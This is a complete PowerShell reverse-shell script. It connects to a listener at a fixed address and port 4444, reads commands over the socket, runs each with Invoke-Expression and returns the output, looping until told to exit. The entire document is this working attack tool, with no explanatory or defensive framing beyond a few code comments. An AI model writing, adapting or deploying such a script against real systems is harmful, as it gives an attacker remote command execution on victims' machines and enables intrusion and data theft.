$ListenerIP = "10.0.0.138"
$ListenerPort = 4444

$Client = New-Object System.Net.Sockets.TcpClient

# Connect to the listener. Consider adding a timeout for the connection.
$Client.Connect($ListenerIP, $ListenerPort)

$Stream = $Client.GetStream()
$StreamReader = New-Object System.IO.StreamReader $Stream
$StreamWriter = New-Object System.IO.StreamWriter $Stream

function Send-Data {
    param (
        [string]$data
    )
    $StreamWriter.Write($data) # Use Write instead of WriteLine to avoid newline
    $StreamWriter.Flush()
}

function Receive-Data {
    $data = $StreamReader.ReadLine()
    return $data
}

# Function to send the command prompt symbol on the same line as input
function Send-Prompt {
    Send-Data "$ "
}

# Simplified command execution with error handling
function Execute-Command {
    param (
        [string]$command
    )
    try {
        $Output = Invoke-Expression $command
        return $Output
    } catch {
        return "Error: $_"
    }
}

Send-Prompt # Initial prompt

while ($true) {
    try {
        $Command = Receive-Data
        if ($Command -eq "exit") {
            break
        }
        $Output = Execute-Command $Command
        Send-Data "`n$Output`n$" # Ensure output is followed by a newline for clarity
    } catch {
        Send-Data "Error: $_`n"
    } finally {
        Send-Prompt
    }
}

$Client.Close()
